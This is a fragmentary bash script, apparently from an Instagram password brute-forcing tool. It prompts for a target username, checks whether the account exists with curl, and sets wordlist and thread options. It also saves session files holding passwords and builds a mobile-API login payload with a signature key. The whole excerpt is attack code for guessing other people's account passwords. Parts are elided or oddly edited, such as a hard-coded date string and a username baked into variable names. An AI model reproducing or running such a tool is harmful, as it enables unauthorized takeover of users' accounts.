...
checkroot
dependencies
read -p $'\e[1;92m 📝 Enter The Username For The Account: \e[0m' cristal_me010
checkaccount=$(curl -s https://www.instagram.com/$cristal_me010/?__a=1 | grep -c "The User May Have Been Banned Or Page Being Deleted/Non-Exsistance/No User (cristal_me010)")
...
threads="${threads:-${default_wl_pass}}"
fi
}
...
default_session="Y"
printf "\n\e[1;77m 📲 Save session for user \e[0m\e[1;92m %s \e[0m" $cristal_me010
...
printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\n" $user $pass $wl_pass > sessions/store.session.$cristal_me010.$(date +"31-10-2025")
...
data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$cristal_me010'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
